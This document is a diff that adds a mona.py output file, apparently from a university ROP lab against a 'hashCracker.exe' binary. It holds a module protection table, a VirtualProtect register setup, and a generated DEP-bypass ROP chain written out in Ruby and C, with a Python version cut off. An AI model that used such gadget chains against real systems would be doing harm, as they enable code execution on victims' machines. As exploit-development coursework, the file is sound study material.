@@ -1,0 +1,700 @@
+-----------------------------------------------------------------------------------------------------------------------------------------
+ Module info :
+-----------------------------------------------------------------------------------------------------------------------------------------
+ Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
+-----------------------------------------------------------------------------------------------------------------------------------------
+ 0x77640000 | 0x77687000 | 0x00047000 | True   | True    | True  |  True    | True   | 6.1.7601.18015 [KERNELBASE.dll] (C:\Windows\syswow64\KERNELBASE.dll)
+ 0x11220000 | 0x11247000 | 0x00027000 | False  | True    | False |  True    | False  | -1.0- [hashCracker.exe] (C:\Users\mflack\Desktop\School\CSC848\Lab01-ROP\hashCracker.exe)
+ 0x76a90000 | 0x76ba0000 | 0x00110000 | True   | True    | True  |  True    | True   | 6.1.7601.18015 [kernel32.dll] (C:\Windows\syswow64\kernel32.dll)
+ 0x76fc0000 | 0x7706c000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7601.17744 [msvcrt.dll] (C:\Windows\syswow64\msvcrt.dll)
+ 0x75180000 | 0x7518c000 | 0x0000c000 | True   | True    | True  |  True    | True   | 6.1.7601.24545 [CRYPTBASE.dll] (C:\Windows\syswow64\CRYPTBASE.dll)
+ 0x75190000 | 0x751f0000 | 0x00060000 | True   | True    | True  |  True    | True   | 6.1.7601.24545 [SspiCli.dll] (C:\Windows\syswow64\SspiCli.dll)
+ 0x77a70000 | 0x77bf0000 | 0x00180000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SysWOW64\ntdll.dll)
+ 0x77460000 | 0x77501000 | 0x000a1000 | True   | True    | True  |  True    | True   | 6.1.7601.24545 [ADVAPI32.dll] (C:\Windows\syswow64\ADVAPI32.dll)
+ 0x77540000 | 0x77630000 | 0x000f0000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\syswow64\RPCRT4.dll)
+ 0x76d00000 | 0x76d19000 | 0x00019000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SysWOW64\sechost.dll)
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+################################################################################
+
+Register setup for VirtualProtect() :
+--------------------------------------------
+ EAX = NOP (0x90909090)
+ ECX = lpOldProtect (ptr to W address)
+ EDX = NewProtect (0x40)
+ EBX = dwSize
+ ESP = lPAddress (automatic)
+ EBP = ReturnTo (ptr to jmp esp)
+ ESI = ptr to VirtualProtect()
+ EDI = ROP NOP (RETN)
+ --- alternative chain ---
+ EAX = ptr to &VirtualProtect()
+ ECX = lpOldProtect (ptr to W address)
+ EDX = NewProtect (0x40)
+ EBX = dwSize
+ ESP = lPAddress (automatic)
+ EBP = POP (skip 4 bytes)
+ ESI = ptr to JMP [EAX]
+ EDI = ROP NOP (RETN)
+ + place ptr to "jmp esp" on stack, below PUSHAD
+--------------------------------------------
+
+
+ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
+----------------------------------------------------------
+
+*** [ Ruby ] ***
+
+  def create_rop_chain()
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = 
+    [
+      #[---INFO:gadgets_to_set_ebp:---]
+      0x7701130a,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x7701130a,  # skip 4 bytes [msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_ebx:---]
+      0x76ff1a3a,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x397501ff,  # put delta into eax (-> put 0x00000201 into ebx)
+      0x76fe7a6b,  # ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x41414141,  # Filler (compensate)
+      0x41414141,  # Filler (compensate)
+      0x41414141,  # Filler (compensate)
+      0x41414141,  # Filler (compensate)
+      0x7702d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_edx:---]
+      0x76fd14a2,  # POP EDX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0xffffffff,  #  
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_ecx:---]
+      0x7701fdeb,  # POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x77066cd8,  # &Writable location [msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_edi:---]
+      0x76ff0a77,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fc9f09,  # RETN (ROP NOP) [msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_esi:---]
+      0x7704158e,  # POP ESI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fcb7bd,  # JMP [EAX] [msvcrt.dll]
+      0x76ff1a3a,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fc11b8,  # ptr to &VirtualProtect() [IAT msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:pushad:---]
+      0x77025cfc,  # PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:extras:---]
+      0x770446fd,  # ptr to 'call esp' [msvcrt.dll] ** REBASED ** ASLR
+    ].flatten.pack("V*")
+
+    return rop_gadgets
+
+  end
+
+
+  # Call the ROP chain generator inside the 'exploit' function :
+
+
+  rop_chain = create_rop_chain()
+
+
+
+*** [ C ] ***
+
+  #define CREATE_ROP_CHAIN(name, ...) \
+    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
+    unsigned int name[name##_length / sizeof(unsigned int)]; \
+    create_rop_chain(name, ##__VA_ARGS__);
+
+  int create_rop_chain(unsigned int *buf, unsigned int )
+  {
+    // rop chain generated with mona.py - www.corelan.be
+    unsigned int rop_gadgets[] = {
+      //[---INFO:gadgets_to_set_ebp:---]
+      0x7701130a,  // POP EBP // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x7701130a,  // skip 4 bytes [msvcrt.dll] ** REBASED ** ASLR
+      //[---INFO:gadgets_to_set_ebx:---]
+      0x76ff1a3a,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x397501ff,  // put delta into eax (-> put 0x00000201 into ebx)
+      0x76fe7a6b,  // ADD EAX,C68B0002 // POP EDI // POP ESI // POP EBX // POP EBP // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x41414141,  // Filler (compensate)
+      0x41414141,  // Filler (compensate)
+      0x41414141,  // Filler (compensate)
+      0x41414141,  // Filler (compensate)
+      0x7702d3a5,  // XCHG EAX,EBX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      //[---INFO:gadgets_to_set_edx:---]
+      0x76fd14a2,  // POP EDX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0xffffffff,  //  
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  // INC EDX // SUB BH,BH // DEC ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      //[---INFO:gadgets_to_set_ecx:---]
+      0x7701fdeb,  // POP ECX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x77066cd8,  // &Writable location [msvcrt.dll] ** REBASED ** ASLR
+      //[---INFO:gadgets_to_set_edi:---]
+      0x76ff0a77,  // POP EDI // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fc9f09,  // RETN (ROP NOP) [msvcrt.dll] ** REBASED ** ASLR
+      //[---INFO:gadgets_to_set_esi:---]
+      0x7704158e,  // POP ESI // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fcb7bd,  // JMP [EAX] [msvcrt.dll]
+      0x76ff1a3a,  // POP EAX // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fc11b8,  // ptr to &VirtualProtect() [IAT msvcrt.dll] ** REBASED ** ASLR
+      //[---INFO:pushad:---]
+      0x77025cfc,  // PUSHAD // RETN [msvcrt.dll] ** REBASED ** ASLR 
+      //[---INFO:extras:---]
+      0x770446fd,  // ptr to 'call esp' [msvcrt.dll] ** REBASED ** ASLR
+    };
+    if(buf != NULL) {
+      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
+    };
+    return sizeof(rop_gadgets);
+  }
+
+  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
+  CREATE_ROP_CHAIN(rop_chain, );
+  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
+  // unsigned int rop_chain[256];
+  // int rop_chain_length = create_rop_chain(rop_chain, );
+
+*** [ Python ] ***
+
+  def create_rop_chain():
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+      #[---INFO:gadgets_to_set_ebp:---]
+      0x7701130a,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x7701130a,  # skip 4 bytes [msvcrt.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_ebx:---]
+      0x76ff1a3a,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x397501ff,  # put delta into eax (-> put 0x00000201 into ebx)
+      0x76fe7a6b,  # ADD EAX,C68B0002 # POP EDI # POP ESI # POP EBX # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x41414141,  # Filler (compensate)
+      0x41414141,  # Filler (compensate)
+      0x41414141,  # Filler (compensate)
+      0x41414141,  # Filler (compensate)
+      0x7702d3a5,  # XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_edx:---]
+      0x76fd14a2,  # POP EDX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0xffffffff,  #  
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x76fd6fe3,  # INC EDX # SUB BH,BH # DEC ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
